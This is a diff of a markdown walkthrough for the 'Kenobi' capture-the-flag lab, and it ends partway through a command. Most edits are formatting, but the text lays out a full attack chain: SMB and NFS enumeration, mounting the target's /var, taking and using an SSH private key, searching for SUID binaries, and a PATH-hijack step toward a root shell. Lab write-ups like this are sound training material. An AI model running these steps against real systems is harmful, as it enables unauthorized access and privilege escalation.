@@ -12,17 +12,19 @@ export IP=10.10.184.151
 
 ## Task 1 - Deploy the vulnerable machine
 
-* Scan the machine with nmap, how many ports are open?  
+* Scan the machine with nmap, how many ports are open?
 	
 	```
 	nmap -sV $IP | tee nmap-scan.txt
 	```
 
+	File scan resulted [here](./file/nmap-scan.txt)
+
 	![task1-nmap](./images/task1-nmap.png)
 
 ## Task 2 - Enumerating Samba for shares
 
-* Using the nmap command below, how many shares have been found?  
+* Using the nmap command below, how many shares have been found?
 	
 	```
 	nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $IP
@@ -30,7 +32,7 @@ export IP=10.10.184.151
 
 	![task2-samba](./images/task2-samba.png)
 
-* Once you're connected, list the files on the share. What is the file can you see?  
+* Once you're connected, list the files on the share. What is the file can you see?
 	
 	```
 	smbclient //$IP/anonymous
@@ -38,11 +40,11 @@ export IP=10.10.184.151
 
 	![task2-smbclient](./images/task2-smbclient.png)
 
-	Get the file [here.](./files/log.txt)
+	Get the file [here](./files/log.txt)
 
 	![task2-smbget](./images/task2-smbget.png)
 
-* In our case, port 111 is access to a network file system. Lets use nmap to enumerate this. What mount can we see?  
+* In our case, port 111 is access to a network file system. Lets use nmap to enumerate this. What mount can we see?
 	
 	```
 	sudo nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $IP
@@ -80,52 +82,66 @@ Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP
 	
 	![task3-copy](./images/task3-copy.png)
 
-* What is Kenobi's user flag (/home/kenobi/user.txt)?  
+* What is Kenobi's user flag (/home/kenobi/user.txt)?
+
 	* Lets mount the /var/tmp directory to our machine
 	
 		```
 		mkdir /tmp/KenobiNFS
-		sudo mount 10.10.231.1:/var /tmp/KenobiNFS
+		sudo mount $IP:/var /tmp/KenobiNFS
 		ls -la /tmp/KenobiNFS
 		```
 		
 		![task3-kenobiNFS](./images/task3-kenobiNFS.png)
 
 	*  We now have a network mount on our deployed machine! We can go to /var/tmp and get the private key then login to Kenobi's account.
+	
 		```
-		cp /tmp/kenobiNFS/tmp/id_rsa .
+		cp /tmp/KenobiNFS/tmp/id_rsa .
 		sudo chmod 600 id_rsa
-		ssh -i id_rsa kenobi@10.10.231.1
+		ssh -i id_rsa kenobi@$IP
 		```
-		Get the file [here.](./files/id_rsa)
+		
+		Get the file [here](./files/id_rsa)
 
 		![task3-id_rsa](./images/task3-id_rsa.png)
 
 	* What is Kenobi's user flag (/home/kenobi/user.txt)?
 		
+		```
+		cat /home/kenobi/user.txt
+		```
+
 		![task3-usertext](./images/task3-usertext.png)
 
 ## Task 4 - Privilege Escalation with Path Variable Manipulation
 
 * What file looks particularly out of the ordinary?
 	
-	`find / -type f -perm -4000 -ls 2>/dev/null`
+	```
+	find / -type f -perm -4000 -ls 2>/dev/null
+	```
 
 	![task4-SUID](./images/task4-SUID.png)
 
 * Run the binary, how many options appear?
 	
-	`/usr/bin/menu`
+	```
+	/usr/bin/menu
+	```
 
 	![task4-binary](./images/task4-binary.png)
 
 * Strings is a command on Linux that looks for human readable strings on a binary. 
 	
-	`strings /usr/bin/menu`
+	```
+	strings /usr/bin/menu
+	```
 
 	![task4-strings](./images/task4-strings.png)
 
 * As this file runs as the root users privileges, we can manipulate our path gain a root shell.
+
 	```
 	echo /bin/sh > curl
 	chmod 777 curl
